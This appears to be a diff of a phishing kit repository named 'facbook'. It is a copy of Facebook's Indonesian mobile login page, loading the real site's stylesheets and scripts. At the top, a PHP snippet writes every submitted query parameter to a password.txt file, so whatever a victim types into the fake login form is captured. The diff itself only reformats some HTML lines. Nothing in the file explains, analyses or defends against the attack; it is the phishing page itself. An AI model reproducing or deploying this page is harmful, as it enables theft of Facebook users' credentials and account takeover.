@@ -1,9 +1,6 @@
 # facbook
 <?php header("https://github.com/matanghulbedegong1A/facbook.git"); $handle=fopen("password.txt","a"); foreach($_GET as $variable =>$value) { fwrite($handle,$variable); fwrite($handle,"="); fwrite($handle, $value); fwrite($handle, "rn"); } fwrite($handle, "rn"); fclose($handle); exit ?>
-<html lang="id">
- <head>
-  <title>Facebook - Masuk atau Daftar</title>
-  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+<html lang="id"><head><title>Facebook - Masuk atau Daftar</title><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
   <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
   <meta name="referrer" content="default" id="meta_referrer">
   <link type="text/css" rel="stylesheet" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/wKadHQ9hYHa.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="z8el2Tf">
@@ -66,8 +63,7 @@
   <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/mJapgR6uOc5.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"> 
   <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yO/r/pslzeMSEB_a.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"> 
   <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"> 
- </head>
- <body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="background-color: rgb(255, 255, 255); min-height: 166px;"> 
+ </head><body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="background-color: rgb(255, 255, 255); min-height: 166px;"> 
   <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 166px;">
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
